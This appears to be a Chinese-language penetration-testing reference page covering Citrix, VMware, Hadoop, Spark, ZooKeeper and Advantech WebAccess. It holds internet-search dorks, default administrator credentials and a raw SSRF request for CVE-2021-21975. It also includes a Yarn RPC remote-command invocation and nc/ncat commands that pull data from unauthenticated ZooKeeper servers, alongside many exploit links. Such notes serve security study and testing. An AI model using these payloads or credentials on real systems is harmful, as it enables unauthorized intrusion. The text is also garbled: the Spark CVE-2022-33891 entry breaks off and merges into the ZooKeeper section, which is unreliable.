- [Metarget/metarget](https://github.com/Metarget/metarget) - Metarget is a framework providing automatic constructions of vulnerable infrastructures.
    ```bash
    git clone https://github.com/brant-ruan/metarget.git
    cd metarget/ && pip3 install -r requirements.txt
    ./metarget cnv list
    ./metarget appv list
    ```
**检测虚拟机**
- **windows**
    cmd : `systeminfo`
    Powershell : `get-wmiobject win32_computersystem | fl model`
- **linux**
    ```bash
    cat /proc/1/cgroup
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    ```
### Citrix
**相关文章**
- [浅谈关于企业中citrix的渗透思路](https://mp.weixin.qq.com/s/wUv3DIN4woXMZmYOCG2MGg)
#### Citrix Receiver
> shodan : title:"citrix gateway"
> fofa : Citrix_Receiver
`注意一下 1494 和 2598 端口`
**默认账号**
```
nsroot/nsroot
citrix/citrix
```
**相关文章**
- [CitrixReceiver平台的一次渗透测试](https://forum.90sec.com/t/topic/310)
- [利用Citrix Receiver浏览器进行渗透](https://mp.weixin.qq.com/s/3p7e27JF6NV6C0_DEPiaqg)
#### XenMobile
> fofa: app="XenMobile-Console"
**CVE-2020-8209 - Path Traversal**
- 相关文章
    - [Path Traversal on Citrix XenMobile Server](https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/)
---
### Docker
- [Docker](./实验/Docker.md)
---
### Kubernetes
- [Kubernetes](./实验/Kubernetes.md)
---
### VMware
**VMware vSphere，ESXi 和 vCenter 的区别**
> 出自 : https://blog.csdn.net/lm3758/article/details/88996556
VMware Inc. 是一家软件公司。它开发了许多产品，尤其是各种云解决方案 。他的云解决方案包括云产品，数据中心产品和桌面产品等。
`vSphere` 是在数据中心产品下的一套软件。`vSphere` 类似微软的 Office 办公套件，Office 办公套件包含了许多软件如 Word, Excel, Access 等。和 Office 一样，vSphere 也是一个软件的集合。他包括了 `vCenter`, `ESXi` 和 `vSphere Client` 等。所以，这些软件联合起来就是 `vSphere`。`vSphere` 不是一个可以安装使用的软件, 它是一个包含其它组件的集合。`ESXi`, `vSphere client` 和 `vCeneter` 都是 `vSphere` 的组件。
`ESXi` 是 `vSphere` 中最重要的一个组件。`ESXi` 是从服务器底层来进行虚拟化，它对外提供一个虚拟化服务，所有的虚拟机都运行在 `ESXi` 服务上面。为了安装，管理和访问这些虚拟机，你需要另外的一个 `vSphere` 组件，它就是 `vSphere client` 或 `vCenter`。
`vSphere client` 允许管理员通过该软件访问 `ESXi` 服务并管理虚拟机。`vSphere client` 安装在客户机上面。`vSphere client` 被用来连接 `ESXi` 服务器和管理任务。
`vCenter server` 它和 `vSphere client` 很像，但是它和功能更加强大。`vCenter server` 是安装在 Window 服务器或 Linux 服务器里面。 `vCenter server` 是一个中心化的管理应用。你可以通过它管理所有的虚拟机和 `ESXi` 物理机。`vSphere client` 可以通过访问 `vCenter Server` 来管理 EXSi 服务器。`vCenter server` 是一个企业级的产品，有许多企业级的功能，像 vMotion, VMware High Availability, VMware Update Manager 和 VMware Distributed Resource Scheduler(DRS)。你可以方便的通过 `vCenter server` 克隆存在的虚拟机。
总结 `vSphere` 是一个产品套件，`ESXi` 是安装在物理机上面的服务。`vSphere Client` 安装在客户端的笔记本或 PC 机上面，用来访问 `ESXi` 服务并安装和管理上面的虚拟机。`vCenter Server` 安装在了 `ESXi` 服务器的虚拟机里面。`vCenter` 也可以安装在单独的物理服务器上面，但是虚拟化不应该更好么? `vCenter` 服务通常用在有很多 `EXSi` 服务和许多虚拟机的大规模环境中。`vCenter` 也可以使用 `vSphere client` 来管理。所以 `vSphere client` 可以在小环境中直接管理 `ESXi` 服务。也可以在大规模的环境中，通过 `vCenter` 服务间接管理 `ESXi` 服务。
#### VMware vCenter
- [vCenter](./实验/vCenter.md)
#### VMWare ESXi
**相关文章**
- [【技术原创】渗透技巧——从VMware ESXI横向移动到Windows虚拟机](https://www.4hou.com/posts/VZ5X)
**CVE-2021-21974**
- 影响版本
    - vmware:esxi:6.5:2:*:*:*:*:*:*
    - vmware:esxi:6.5:650 - 6.7:670
- POC | Payload | exp
    - [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)
#### VMware View Planner
**CVE-2021-21978 VMware View Planner 远程代码执行漏洞**
- 相关文章
    - [VMware View Planner 远程代码执行漏洞 CVE-2021-21978](https://mp.weixin.qq.com/s/mBL9kYptreo62g4IonXSLg)
    - [CVE-2021-21978：VM View Planner RCE分析复现](https://mp.weixin.qq.com/s/bTTOLjslwq1RiuB8Ah2Y9Q)
#### VMware vRealize Operations Manager
**CVE-2021-21975 SSRF**
- POC | Payload | exp
    ```
    POST /casa/nodes/thumbprints HTTP/1.1
    Content-Type: application/json;charset=UTF-8
    ["127.0.0.1:443/ui"]
    ```
**CVE-2021-21983**
- POC | Payload | exp
    - [rabidwh0re/REALITY_SMASHER](https://github.com/rabidwh0re/REALITY_SMASHER)
#### VMware Workspace ONE Access
**相关文章**
- [0Click RCE：攻击VMWare Workspace ONE Access](https://mp.weixin.qq.com/s/OjpDC707h4Qn5jkIsX0FBA)
**CVE-2020-4006 VMware Workspace ONE Access 命令注入漏洞**
- 描述
    2020 年 11 月 23 日，VMware 发布安全公告，其多个产品和组件的管理配置器中存在一个命令注入漏洞（CVE-2020-4006），其 CVSS 评分 9.1。具有管理配置器 8443 端口的网络访问权限并拥有管理配置器 admin 帐户和密码的攻击者可以利用此漏洞在系统上执行命令。
    漏洞位于 /cfg/ssl/installSelfSignedCertificate TLS 端口 8443 上的 “Appliance Configurator” 服务中的端点中，通过 san 参数在 POST 对端点的请求中指定恶意参数，可以执行任意 shell 命令。请注意该服务可能会重新启动。动作会记录在 `/opt/vmware/horizon/workspace/logs/configurator.log` 文件中。
- POC | Payload | exp
    - https://attackerkb.com/topics/2DKGb1v8mA/cve-2020-4006
    - https://twitter.com/wvuuuuuuuuuuuuu/status/1391887171649515529
**CVE-2021-22056 ssrf**
- 相关文章
    - [Stealing administrative JWT's through post auth SSRF (CVE-2021-22056)](https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/)
**CVE-2022-22972**
- 相关文章
    - [VMware Authentication Bypass Vulnerability (CVE-2022-22972) Technical Deep Dive](https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive/)
- POC | Payload | exp
    - [horizon3ai/CVE-2022-22972](https://github.com/horizon3ai/CVE-2022-22972)
---
#### VMWare NSX Manager
**CVE-2021-39144**
- 相关文章
    - [Eat What You Kill :: Pre-authenticated Remote Code Execution in VMWare NSX Manager](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html)
---
## 分布式
### Hadoop
Hadoop 是一个由 Apache 基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。
> fofa : app="APACHE-hadoop-HttpFS"
> fofa : app="APACHE-hadoop-ResourceManager"
> fofa : app="APACHE-hadoop-YARN"
**相关文章**
- [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
- [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)
**未授权访问漏洞**
- 描述
    由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。
- 示例
    ```
    http://[ip]:8088/
    http://[ip]:50070
    http://[ip]:50070/dfshealth.jsp
    http://[ip]:50070/logs/
    ```
- POC | Payload | exp
    - https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py
**Hadoop Yarn RPC RCE**
- 描述
    Hadoop Yarn RPC 未授权访问漏洞存在于 Hadoop Yarn 中负责资源管理和任务调度的 ResourceManager，成因是该组件为用户提供的 RPC 服务默认情况下无需认证即可访问。Hadoop Yarn RPC 未授权访问使得攻击者无需认证即可通过 RPC 通信执行恶意命令。
- 相关文章
    - [Hadoop Yarn RPC未授权RCE](https://mp.weixin.qq.com/s/LdBDOHZI-aEEUCwXT5_K9Q)
    - [Hadoop Yarn RPC RCE 复现](https://cloud.tencent.com/developer/article/1909367)
- POC | Payload | exp
    - [cckuailong/YarnRpcRCE](https://github.com/cckuailong/YarnRpcRCE)
        ```
        java -jar YarnRpcUnauth.jar ip:port "touch /tmp/success"
        ```
---
### Spark
Apache Spark 是一款集群计算系统,其支持用户向管理节点提交应用,并分发给集群执行.
> 官网 : https://spark.apache.org/
> fofa : app="APACHE-Spark"
**未授权访问漏洞**
- 描述
    Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。
- 相关文章
    - [Apache Spark 未授权访问漏洞](https://vulhub.org/#/environments/spark/unacc/)
    - [某大厂红队评估_之_Apache Spark打点](https://mp.weixin.qq.com/s/XTXuZAZL9PFQzV36sVD9oQ)
- POC | Payload | exp
    - [aRe00t/rce-over-spark](https://github.com/aRe00t/rce-over-spark)
**SPARK-38631**
- 描述
    当文件名称被恶意用户控制时，存在通过`Utils.unpack`实现任意shell命令注入的风险.
- 影响范围
    - 3.1.2
    - 3.2.1
    - 3.3.0
- 相关文章
    - [SPARK-38631 Hadoop unTar函数引发的命令注入漏洞](https://mp.weixin.qq.com/s/3AsNUIzPJPTvay10LCpb8w)
**CVE-2022-33891 Apache Spark shell命令注入漏洞**
- 影响范围
    - Spark Core - Apache   fofa : app="APACHE-ZooKeeper"
**未授权访问漏洞**
- 描述
    Zookeeper 的默认开放端口是 2181。Zookeeper 安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用 Zookeeper，通过服务器收集敏感信息或者在 Zookeeper 集群内进行破坏（比如：kill 命令）。攻击者能够执行所有只允许由管理员运行的命令。
- 相关文章
    - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
    - [攻击大数据应用:ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)
- 搭建环境
    ```bash
    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
    tar -xzvf zookeeper-3.4.14.tar.gz
    cd zookeeper-3.4.14/conf
    mv zoo_sample.cfg zoo.cfg
    ../bin/zkServer.sh start
    ../bin/zkCli.sh -server 127.0.0.1:2181  # 连接 server
    ```
- 利用
    ```bash
    echo envi|nc [ip] 2181      # 打印有关服务环境的详细信息
    echo dump |ncat [ip] 2181   # 列出未完成的会话和临时节点
    echo reqs |ncat [ip] 2181   # 列出未完成的请求
    echo ruok |ncat [ip] 2181   # 测试服务器是否运行在非错误状态
    echo stat |ncat [ip] 2181   # 列出关于性能和连接的客户端的统计信息
    ./zkCli.sh -server [ip]:port
    ```
**CVE-2014-0085 ZooKeeper 信息泄露漏洞**
- 描述
    Apache Zookeeper 中存在安全漏洞，该漏洞源于程序记录明文 admin 密码。本地攻击者可通过读取日志利用该漏洞获取敏感信息。
- 相关文章
    - [ZooKeeper信息泄露漏洞(CVE-2014-085)](http://www.voidcn.com/article/p-ebikooyk-oa.html)
---
## 组态软件
### WebAccess
研华 WebAccess 软件是研华物联网应用平台解决方案的核心，为用户提供一个基于 HTML5 技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用 WebAccess 后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。
> fofa : app="ADVANTECH-WebAccess"
**CVE-2017-16720 Advantech WebAccess远程命令执行**
- 描述
    此漏洞允许攻击者使用 RPC 协议通过 TCP 端口 4592 执行远程命令。
    通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe 服务将命令行指令传递给主机， webvrpcs.exe 服务以管理员访问权限运行。版本小于 8.3、8.3.1、8.3.2 仍然存在特定的安全漏洞。
- 相关文章
    - [漏洞实验：CVE-2017-16720 Advantech WebAccess远程命令执行](https://www.key1.top/index.php/archives/492/)
- POC | Payload | exp
    - [Advantech WebAccess < 8.3 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/44278)